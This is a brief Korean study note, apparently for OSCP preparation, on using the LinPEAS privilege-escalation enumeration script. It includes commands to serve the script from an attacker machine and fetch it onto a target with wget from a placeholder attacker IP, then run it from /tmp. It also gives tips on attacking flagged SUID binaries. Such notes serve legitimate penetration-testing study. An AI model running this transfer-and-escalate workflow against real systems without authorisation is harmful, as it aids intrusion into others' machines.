LinPEAS (Linux Privilege Escalation Awesome Script)는 **리눅스 권한 상승(Linux Privilege Escalation)**에 필요한 정보를 자동으로 수집하고, 잠재적인 취약점을 분석해 주는 스크립트 도구

# LinPEAS 는 자동 툴이라 OSCP 에서는 금지

허용: 정보 수집 (Enumeration) 기능. -> 수집용으로만 사용하기
금지: 자동 악용 (Automated Exploitation) 기능.

```bash
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh

# 탐색만 실행
chmod +x linpeas.sh

# attacker -> 파일 실행 위치 주의
python3 -m http.server 80

# target
cd /tmp # 일반적으로 tmp 는 쓰기가 가능한 디렉토리이므로 이동해서 안전하게 다운로드 시도
wget http://공격자_IP/linpeas.sh

# 쓰기 권한이 가능한 디렉토리 찾기
find / -writable -type d 2>/dev/null

# 실행
/tmp/linpeas.sh > /tmp/linpeas_result.txt
```

- 95% 이상이 공격벡터랑 직접 연결 됨
- GTFOBins에 없더라도 빨강색 SUID/SGID 바이너리는 직접 실행, 코드 분석, 환경 변수·인자 오염, 취약점 검색 등으로 공격 벡터를 찾습니다. 자동화 툴이 알려주는 빨강색은 "직접 분석·공격해야 하는 대상"입니다.
